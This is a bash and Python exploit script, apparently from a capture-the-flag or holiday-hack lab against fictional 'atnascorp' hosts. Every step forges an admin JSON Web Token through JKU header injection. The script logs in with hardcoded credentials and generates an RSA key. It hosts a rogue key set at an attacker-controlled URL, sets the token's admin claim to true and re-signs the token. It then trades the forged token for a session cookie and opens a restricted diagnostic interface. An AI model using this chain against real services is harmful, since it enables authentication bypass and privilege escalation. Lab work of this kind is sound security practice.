#!/bin/bash

# --- Configuration ---
LOGIN_URL="http://idp.atnascorp/login"
AUTH_CHECK_URL="http://gnome-48371.atnascorp/auth"
DIAGNOSTIC_URL="http://gnome-48371.atnascorp/diagnostic-interface"

# Paths
LOCAL_JWKS_PATH="/home/paul/www/5h33pd06.json"
JKU_URL="http://paulweb.neighborhood/5h33pd06.json"
PRIVATE_KEY="priv.key"

# Credentials
LOGIN_PAYLOAD="username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth"

echo "[*] Starting exploit chain..."

# ==============================================================================
# STEP 1: Authenticate and Retrieve Original Token
# ==============================================================================
echo "[*] Authenticating to IDP..."
# We use -L to follow redirects, and -w to print the final effective URL
# The token is usually passed in the query string: .../auth?token=XYZ
FINAL_URL=$(curl -s -L -w "%{url_effective}" -o /dev/null -X POST --data-binary "$LOGIN_PAYLOAD" "$LOGIN_URL")

# Extract the token using grep/sed regex
ORIGINAL_TOKEN=$(echo "$FINAL_URL" | grep -o 'token=[^&]*' | cut -d= -f2)

if [ -z "$ORIGINAL_TOKEN" ]; then
    echo "[-] Failed to retrieve token. Final URL was: $FINAL_URL"
    exit 1
fi

echo "[+] Got Original Token: ${ORIGINAL_TOKEN:0:20}..."

# ==============================================================================
# STEP 2: Generate RSA Keys (using OpenSSL)
# ==============================================================================
echo "[*] Generating RSA keys..."
openssl genrsa -out $PRIVATE_KEY 2048 2>/dev/null

# Extract the Modulus (n) in Hex format for the JWKS
MODULUS_HEX=$(openssl rsa -in $PRIVATE_KEY -modulus -noout | cut -d= -f2)

# ==============================================================================
# STEP 3: Python Helper (Standard Lib Only)
# Handles JSON creation and JWT modifications
# ==============================================================================
echo "[*] Generating JWKS and modifying JWT payload..."

# We pass variables to python via environment variables to avoid shell escaping issues
export MOD_HEX="$MODULUS_HEX"
export TOKEN="$ORIGINAL_TOKEN"
export JKU="$JKU_URL"

# This python script outputs 3 lines: 
# 1. The JWKS JSON content
# 2. The new JWT Header (base64)
# 3. The new JWT Payload (base64)
readarray -t PY_OUTPUT < <(python3 -c '
import os, json, base64, sys

def b64url_enc(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

def b64url_dec(data):
    pad = len(data) % 4
    if pad > 0: data += "=" * (4 - pad)
    return base64.urlsafe_b64decode(data)

# 1. Generate JWKS
n_hex = os.environ["MOD_HEX"]
n_int = int(n_hex, 16)
n_bytes = n_int.to_bytes((n_int.bit_length() + 7) // 8, byteorder="big")
n_b64 = b64url_enc(n_bytes).decode("utf-8")
e_b64 = "AQAB" # 65537 default for openssl

jwks = {
    "keys": [{
        "alg": "RS256", "kty": "RSA", "use": "sig",
        "kid": "pwn3d", "n": n_b64, "e": e_b64
    }]
}
print(json.dumps(jwks))

# 2. Modify Token
token_parts = os.environ["TOKEN"].split(".")
header = json.loads(b64url_dec(token_parts[0]))
payload = json.loads(b64url_dec(token_parts[1]))

header["jku"] = os.environ["JKU"]
header["kid"] = "pwn3d"
payload["admin"] = True # Set admin to true

# Output new header and payload (base64 encoded)
print(b64url_enc(json.dumps(header).encode()).decode("utf-8"))
print(b64url_enc(json.dumps(payload).encode()).decode("utf-8"))
')

JWKS_CONTENT="${PY_OUTPUT[0]}"
NEW_HEADER="${PY_OUTPUT[1]}"
NEW_PAYLOAD="${PY_OUTPUT[2]}"

# ==============================================================================
# STEP 4: Save JWKS and Sign Token
# ==============================================================================
# Write JWKS to file
echo "$JWKS_CONTENT" > "$LOCAL_JWKS_PATH"
echo "[+] JWKS saved to $LOCAL_JWKS_PATH"

# Create the "unsigned" part of the JWT
UNSIGNED_TOKEN="$NEW_HEADER.$NEW_PAYLOAD"

# Sign it using OpenSSL
# 1. Echo -n to avoid newline
# 2. Sign with SHA256
# 3. Base64 encode the binary signature
# 4. Make it URL safe (replace + with -, / with _, remove =)
SIGNATURE=$(echo -n "$UNSIGNED_TOKEN" | openssl dgst -sha256 -sign $PRIVATE_KEY | openssl base64 -e | tr -d '=' | tr '/+' '_-' | tr -d '\n')

FORGED_TOKEN="$UNSIGNED_TOKEN.$SIGNATURE"
echo "[+] Forged Token Created."

# ==============================================================================
# STEP 5: Exploit
# ==============================================================================
echo "[*] Exchanging forged token for session cookie..."
# Get the session cookie using the forged token
# We assume the response sets a cookie named 'session'
COOKIE_RESP=$(curl -v "${AUTH_CHECK_URL}?token=${FORGED_TOKEN}" 2>&1)

# Grep for Set-Cookie header or extract session if in body. 
# Usually curl -v sends headers to stderr.
SESSION_COOKIE=$(echo "$COOKIE_RESP" | grep -o 'session=[^;]*' | head -n 1)

if [ -z "$SESSION_COOKIE" ]; then
    echo "[-] Failed to get session cookie. Check the auth URL manually?"
    # echo "$COOKIE_RESP"
    exit 1
fi

echo "[+] Got Session Cookie: $SESSION_COOKIE"

echo "[*] Accessing Diagnostic Interface..."
echo "=========================================="
curl -H "Cookie: $SESSION_COOKIE" "$DIAGNOSTIC_URL"
echo -e "\n=========================================="

# Cleanup
rm $PRIVATE_KEY
```
